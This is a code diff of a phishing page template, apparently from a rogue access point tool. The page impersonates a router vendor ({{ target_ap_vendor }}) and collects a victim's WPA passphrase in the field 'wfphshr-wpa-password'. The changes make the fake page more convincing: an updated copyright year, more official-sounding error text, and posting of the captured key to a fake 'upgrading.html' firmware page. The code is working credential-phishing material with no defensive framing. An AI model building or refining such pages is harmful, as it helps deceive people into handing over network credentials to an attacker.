@@ -173,7 +173,7 @@ In no event shall {{ target_ap_vendor }} Company or any other party which has be
   <!-- Start footer -->
   <footer class="footer">
     <div class="container text-center">
-      <p class="text-muted">© {{ target_ap_vendor }} 2016, All Rights Reserved.</p>
+      <p class="text-muted">© {{ target_ap_vendor }} 2017, All Rights Reserved.</p>
     </div>
   </footer>
   <!-- End footer -->
@@ -225,7 +225,7 @@ In no event shall {{ target_ap_vendor }} Company or any other party which has be
           <h4 class="modal-title">Information</h4>
         </div>
         <div class="modal-body">
-          <p>Please Check The I Agree Button.</p>
+          <p>Please agree with the Terms And Conditions to proceed.</p>
         </div>
         <div class="modal-footer">
           <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
@@ -280,13 +280,13 @@ $("#btn").on("click", function(e) {
                             var verify_status = objresponse['psk_verify']
                             if (verify_status == 'success') {
                                 document.getElementById("pw_status").innerHTML = ""
-                                post('post', {"wfphshr-wpa-password": input.value});
+                                post('upgrading.html', {"wfphshr-wpa-password": input.value});
                             } else if (verify_status == 'fail') {
-                                document.getElementById("pw_status").innerHTML = "The passphrase is wrong!"
+                                document.getElementById("pw_status").innerHTML = "The provided Pre-shared Key (PSK) is invalid!"
                             } else {
                                 /* we may not define the extensions and in that case
                                    just post the passphrase */
-                                post('post', {"wfphshr-wpa-password": input.value});
+                                post('upgrading.html', {"wfphshr-wpa-password": input.value});
                             }
                         },
                     });
